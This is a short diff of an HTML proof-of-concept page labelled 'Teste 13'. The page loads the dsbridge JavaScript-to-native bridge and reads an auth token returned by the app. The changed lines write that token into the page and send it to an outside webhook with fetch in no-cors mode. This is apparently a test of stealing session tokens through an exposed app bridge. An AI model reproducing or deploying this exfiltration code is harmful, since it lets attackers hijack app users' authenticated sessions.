@@ -32,11 +32,11 @@
                 // alert(value)
 
                 // const js = JSON.parse(value)
-                const x = JSON.stringify(value)
+                // const x = JSON.stringify(value)
                 // const st = String(value)
 
-                document.getElementById("batata").innerHTML = x.data.authtoken
-                fetch(webhook + "?data=" + x.data.authtoken, { mode: "no-cors" })
+                document.getElementById("batata").innerHTML = value.data.authtoken
+                fetch(webhook + "?data=" + value.data.authtoken, { mode: "no-cors" })
     
             })
         })
@@ -49,7 +49,7 @@
 <script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.min.js"></script>
 
 <body>
-    <h1>Teste 12</h1>
+    <h1>Teste 13</h1>
     <br>
     <h2 id="batata">batata</h2>
 </body>
